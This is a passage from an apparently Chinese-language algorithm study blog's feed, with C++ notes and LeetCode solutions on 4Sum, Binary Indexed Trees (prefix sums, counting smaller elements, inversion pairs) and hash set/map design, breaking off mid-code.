class="built_in">push_back</span>(&#123;nums[i],nums[j],nums[left],nums[right]&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>方法二</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">fourSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">size</span>() &lt; <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//跳过相同的数</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt; i + <span class="number">1</span> &amp;&amp; nums[j] == nums[j - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">long</span> partSum = nums[i] + nums[j];</span><br><span class="line">            <span class="type">int</span> m = j + <span class="number">1</span>, n = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (m &lt; n)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (partSum + nums[m] + nums[n] &lt; target)</span><br><span class="line">                    m++;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (partSum + nums[m] + nums[n] &gt; target)</span><br><span class="line">                    n--;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(vector&lt;<span class="type">int</span>&gt;&#123;nums[i], nums[j], nums[m], nums[n]&#125;);</span><br><span class="line">                    m++;</span><br><span class="line">                    <span class="keyword">while</span> (m&lt;n&amp;&amp;nums[m] == nums[m - <span class="number">1</span>])</span><br><span class="line">                        m++;</span><br><span class="line">                    n--;</span><br><span class="line">                    <span class="keyword">while</span> (m&lt;n&amp;&amp;nums[n] == nums[n + <span class="number">1</span>])</span><br><span class="line">                        n--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><a href="https://leetcode.cn/problems/container-with-most-water/">11. 盛最多水的容器</a></p>
<p><a href="https://leetcode.cn/problems/max-number-of-k-sum-pairs/">1679. K 和数对的最大数目</a>（哈希表）</p>
]]></content>
  </entry>
  <entry>
    <title>树状数组(Binary Indexed Tree, BIT)</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E5%8C%BA%E9%97%B4%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84(Binary-Indexed-Tree,-BIT)/</url>
    <content><![CDATA[<h2 id="0-1-树状数组">0.1 树状数组</h2>
<p>树状数组是一种可以动态维护序列前缀和的数据结构（<mark>下标从1开始</mark>）：</p>
<ul class="lvl-0">
<li class="lvl-2">单点更新<code>update(i,v)</code>：将数组<code>i</code>位置的数加上一个值<code>v</code></li>
<li class="lvl-2">区间查询<code>query(i)</code>：查询数组<code>[1...i]</code>区间的区间和，即<code>i</code>位置的前缀和</li>
<li class="lvl-2">lowbit(i)：得到i最低位的1以及后面的0<br>
原始数组为a，树状数组为bit。bit[i]存放从右往左数lowbit(i)个数， $bit[i]=\sum\limits_{k=i-lowbit(i)+1}^{i}a[k]$  。将bit初始化为0，对于每一个数字a[i]，都对bit进行$add(i,a[i])$。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202310021112586.png" alt="Snipaste_2023-10-02_10-59-46.png"></p>
<h2 id="0-2-单点更改">0.2 单点更改</h2>
<p>修改a[3]的值，需要修改每一个包含a[3]的bit[i]，当前块的位置加上当前块的长度可以跳到上面的位置<br>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202310021116874.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> index,<span class="type">long</span> <span class="type">long</span> val)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(index&lt;=n)&#123;</span><br><span class="line">		bit[index]+=val;</span><br><span class="line">		index+=<span class="built_in">lowbit</span>(index);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0-3-区间求和">0.3 区间求和</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202310021134276.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(index&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		sum+=bit[index];</span><br><span class="line">		index-=<span class="built_in">lowbit</span>(index);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0-4-模板">0.4 模板</h2>
<h3 id="0-4-1-BIT类实现">0.4.1 BIT类实现</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BIT</span>&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> n;</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt; bit;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="comment">//总共有n个数字</span></span><br><span class="line">		<span class="built_in">BIT</span>(<span class="type">int</span> _n)&#123;</span><br><span class="line">			n=_n;</span><br><span class="line">			bit=<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (_n<span class="number">+1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//查询前缀和</span></span><br><span class="line">		<span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">			<span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(x)&#123;</span><br><span class="line">				sum+=bit[x];</span><br><span class="line">				x-=<span class="built_in">lowbit</span>(x);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> sum;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//单点更新，val为a[x]变化量</span></span><br><span class="line">		<span class="function"><span class="type">int</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">			<span class="keyword">while</span>(x&lt;=n)&#123;</span><br><span class="line">				bit[x]+=val;</span><br><span class="line">				x+=<span class="built_in">lowbit</span>(x);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0-5-题单">0.5 题单</h2>
<h3 id="0-5-1-315-计算右侧小于当前元素的个数">0.5.1 <a href="https://leetcode-cn.com/problems/count-of-smaller-numbers-after-self/">315. 计算右侧小于当前元素的个数</a></h3>
<blockquote>
<p>给你一个整数数组 nums ，按要求返回一个新数组 counts 。数组 counts 有该性质： counts[i] 的值是  nums[i] 右侧小于 nums[i] 的元素的数量。</p>
</blockquote>
<h4 id="方法一：离散化树状数组">方法一：离散化树状数组</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BIT</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; tree;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">BIT</span>(<span class="type">int</span> _n): <span class="built_in">n</span>(_n),<span class="built_in">tree</span>(_n<span class="number">+1</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查询前缀和</span></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">            <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(x)&#123;</span><br><span class="line">                res+=tree[x];</span><br><span class="line">                x-=<span class="built_in">lowbit</span>(x);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新前缀和</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(x&lt;=n)&#123;</span><br><span class="line">                tree[x]++;</span><br><span class="line">                x+=<span class="built_in">lowbit</span>(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">countSmaller</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; tmp=nums;</span><br><span class="line">        <span class="built_in">sort</span>(tmp.<span class="built_in">begin</span>(),tmp.<span class="built_in">end</span>());</span><br><span class="line">        <span class="comment">// 将数据离散到[1:n]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> &amp;num:nums)&#123;</span><br><span class="line">            num=<span class="built_in">lower_bound</span>(tmp.<span class="built_in">begin</span>(),tmp.<span class="built_in">end</span>(),num)-tmp.<span class="built_in">begin</span>()<span class="number">+1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">counts</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">BIT <span class="title">bit</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            counts[i]=bit.<span class="built_in">query</span>(nums[i]<span class="number">-1</span>);</span><br><span class="line">            bit.<span class="built_in">update</span>(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> counts;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="方法二-归并排序">方法二 归并排序</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution1</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; counts;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; tmp;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; index;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; tmpIndex;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">countSmaller</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        counts.<span class="built_in">resize</span>(n);</span><br><span class="line">        tmp.<span class="built_in">resize</span>(n);</span><br><span class="line"></span><br><span class="line">        index.<span class="built_in">resize</span>(n);</span><br><span class="line">        <span class="built_in">iota</span>(index.<span class="built_in">begin</span>(), index.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        tmpIndex.<span class="built_in">resize</span>(n);</span><br><span class="line">        <span class="built_in">merge_sort</span>(nums, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> counts;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;record, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt;= r) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">merge_sort</span>(record, l, mid);</span><br><span class="line">        <span class="built_in">merge_sort</span>(record, mid + <span class="number">1</span>, r);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并两个数组</span></span><br><span class="line">        <span class="type">int</span> i = l, j = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> pos = l;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">if</span> (record[i] &lt;= record[j]) &#123;</span><br><span class="line">                tmpIndex[pos] = index[i];</span><br><span class="line">                counts[index[i]] += j - (mid + <span class="number">1</span>);</span><br><span class="line">                tmp[pos++] = record[i++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmpIndex[pos] = index[j];</span><br><span class="line">                tmp[pos++] = record[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt;= mid; k++) &#123;</span><br><span class="line">            tmpIndex[pos] = index[k];</span><br><span class="line">            counts[index[k]] += j - (mid + <span class="number">1</span>);</span><br><span class="line">            tmp[pos++] = record[k];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt;= r; k++) &#123;</span><br><span class="line">            tmpIndex[pos] = index[k];</span><br><span class="line">            tmp[pos++] = record[k];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">copy</span>(tmp.<span class="built_in">begin</span>() + l, tmp.<span class="built_in">begin</span>() + r + <span class="number">1</span>, record.<span class="built_in">begin</span>() + l);</span><br><span class="line">        <span class="built_in">copy</span>(tmpIndex.<span class="built_in">begin</span>() + l, tmpIndex.<span class="built_in">begin</span>() + r + <span class="number">1</span>, index.<span class="built_in">begin</span>() + l);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="0-5-2-LCR-170-交易逆序对的总数">0.5.2 <a href="https://leetcode.cn/problems/shu-zu-zhong-de-ni-xu-dui-lcof/description/">LCR 170. 交易逆序对的总数 </a></h3>
<h4 id="方法一：离散化树状数组-2">方法一：离散化树状数组</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; bit;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reversePairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; record)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n=record.<span class="built_in">size</span>();</span><br><span class="line">        bit.<span class="built_in">resize</span>(n<span class="number">+1</span>);</span><br><span class="line"></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; tmp=record;</span><br><span class="line">        <span class="built_in">sort</span>(tmp.<span class="built_in">begin</span>(),tmp.<span class="built_in">end</span>());</span><br><span class="line">        <span class="comment">// 离散化数组[1,...,n]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> &amp;num:record)&#123;</span><br><span class="line">            num=<span class="built_in">lower_bound</span>(tmp.<span class="built_in">begin</span>(),tmp.<span class="built_in">end</span>(),num)-tmp.<span class="built_in">begin</span>()<span class="number">+1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            ans+=<span class="built_in">query</span>(record[i]<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">update</span>(record[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(index&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            sum+=bit[index];</span><br><span class="line">            index-=<span class="built_in">lowbit</span>(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(index&lt;=n)&#123;</span><br><span class="line">            bit[index]++;</span><br><span class="line">            index+=<span class="built_in">lowbit</span>(index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="方法二：归并排序">方法二：归并排序</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> <span class="title function_">reversePairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; record)</span> &#123;</span><br><span class="line">        <span class="type">int</span> n=record.size();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; <span class="title function_">tmp</span><span class="params">(n)</span>;</span><br><span class="line">        <span class="keyword">return</span> merge_sort(record,tmp,<span class="number">0</span>,n-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">merge_sort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; record,vector&lt;<span class="type">int</span>&gt;&amp; tmp,<span class="type">int</span> l,<span class="type">int</span> r)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&gt;=r)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid=l+(r-l)/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> inv_count=merge_sort(record,tmp,l,mid)+merge_sort(record,tmp,mid+<span class="number">1</span>,r);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//合并两个数组</span></span><br><span class="line">        <span class="type">int</span> i=l,j=mid+<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> pos=l;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(record[i]&lt;=record[j])&#123;</span><br><span class="line">                inv_count+=j-(mid+<span class="number">1</span>);</span><br><span class="line">                tmp[pos++]=record[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tmp[pos++]=record[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=mid;k++)&#123;</span><br><span class="line">            tmp[pos++]=record[k];</span><br><span class="line">            inv_count+=j-(mid+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=j;k&lt;=r;k++)</span><br><span class="line">            tmp[pos++]=record[k];</span><br><span class="line">        copy(tmp.begin()+l,tmp.begin()+r+<span class="number">1</span>,record.begin()+l);</span><br><span class="line">        <span class="keyword">return</span> inv_count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="0-6-参考">0.6 参考</h2>
<p><a href="https://www.sohu.com/a/471187961_121124361">什么是树状数组？让这个12岁年轻人为你讲解_lowbit (sohu.com)</a></p>
<p><a href="https://blog.csdn.net/u010598215/article/details/48206959">(78条消息) 树状数组求区间最大值_LbyG的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/TheWayForDream/article/details/118436732">(78条消息) 树状数组(详细分析+应用)，看不懂打死我!_树形数组_鲜果维他命的博客-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/Last--Whisper/p/13823614.html">树状数组（BIT）—— 一篇就够了 - Last_Whisper - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>哈希表</title>
    <url>/2023/10/27/%E7%AE%97%E6%B3%95/%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
    <content><![CDATA[<blockquote>
<p>哈希表（散列表），O(n)的时间复杂度存储数据，通过哈希函数映射位置，实现O(1)的时间复杂度进行插入、查找、删除等操作。<br>
unordered_set，判断元素是否在集合中<br>
unordered_map，统计频率，记录内容如果元素有穷，出现范围不大，可以用一个固定的数组存储和统计元素。统计一个字符串中所有小写字母的出现次数，可以用大小为26的数组统计，对应的哈希函数为$ch-‘a’$</p>
</blockquote>
<p>哈希表包括可以映射到的哈希地址范围，对于映射到同一地址的值，有不同的组织方式。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>哈希函数：能够将集合中任意可能的元素映射到一个固定范围的整数值，并将该元素存储到整数值对应的地址上。</p>
</li>
<li class="lvl-2">
<p>冲突处理：由于不同元素可能映射到相同的整数值，因此需要在整数值出现「冲突」时，需要进行冲突处理。总的来说，有以下几种策略解决冲突：</p>
<ul class="lvl-2">
<li class="lvl-6">链地址法：为每个哈希值维护一个链表，并将具有相同哈希值的元素都放入这一链表当中。</li>
<li class="lvl-6">开放地址法：当发现哈希值 hhh 处产生冲突时，根据某种策略，从 hhh 出发找到下一个不冲突的位置。例如，一种最简单的策略是，不断地检查 h+1,h+2,h+3,…h+1,h+2,h+3,\ldotsh+1,h+2,h+3,… 这些整数对应的位置。</li>
<li class="lvl-6">再哈希法：当发现哈希冲突后，使用另一个哈希函数产生一个新的地址。</li>
</ul>
</li>
<li class="lvl-2">
<p>扩容：当哈希表元素过多时，冲突的概率将越来越大，而在哈希表中查询一个元素的效率也会越来越低。因此，需要开辟一块更大的空间，来缓解哈希表中发生的冲突。</p>
</li>
</ul>
<h2 id="哈希集合">哈希集合</h2>
<p><a href="https://leetcode.cn/problems/design-hashset/description/">705. 设计哈希集合 - 力扣（LeetCode）</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyHashSet</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;list&lt;<span class="type">int</span>&gt;&gt; data;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> base=<span class="number">769</span>;</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hash</span><span class="params">(<span class="type">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> key%base;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyHashSet</span>():<span class="built_in">data</span>(base) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> h=<span class="built_in">hash</span>(key);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=data[h].<span class="built_in">begin</span>();it!=data[h].<span class="built_in">end</span>();++it)&#123;</span><br><span class="line">            <span class="keyword">if</span>(*it==key)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        data[h].<span class="built_in">emplace_back</span>(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> h=<span class="built_in">hash</span>(key);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=data[h].<span class="built_in">begin</span>();it!=data[h].<span class="built_in">end</span>();++it)&#123;</span><br><span class="line">            <span class="keyword">if</span>(*it==key)&#123;</span><br><span class="line">                data[h].<span class="built_in">erase</span>(it);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">contains</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> h=<span class="built_in">hash</span>(key);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=data[h].<span class="built_in">begin</span>();it!=data[h].<span class="built_in">end</span>();++it)&#123;</span><br><span class="line">            <span class="keyword">if</span>(*it==key)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="哈希表">哈希表</h2>
<p><a href="https://leetcode.cn/problems/design-hashmap/description/">706. 设计哈希映射 - 力扣（LeetCode）</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyHashMap</span> &#123;</span><br><span class="line">    vector&lt;list&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; data;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> base=<span class="number">769</span>;</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hash</span><span class="params">(<span class="type">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> key%base;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyHashMap</span>():<span class="built_in">data</span>(base) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> h=<span class="built_in">hash</span>(key);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=data[h].<span class="built_in">begin</span>();it!=data[h].<span class="built_in">end</span>();++it)&#123;</span><br><span class="line">            <span class="keyword">if</span>((*it).first==key)&#123;</span><br><span class="line">                (*it).second=value;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        data[h].<span class="built_in">emplace_back</span>(key,value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> h=<span class="built_in">hash</span>(key);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=data[h].<span class="built_in">begin</span>();it!=data[h].<span class="built_in">end</span>();++it)&#123;</span><br><span class="line">            <span class="keyword">if</span>((*it).first==key)&#123;</span><br><span class="line">                <span class="keyword">return</span> 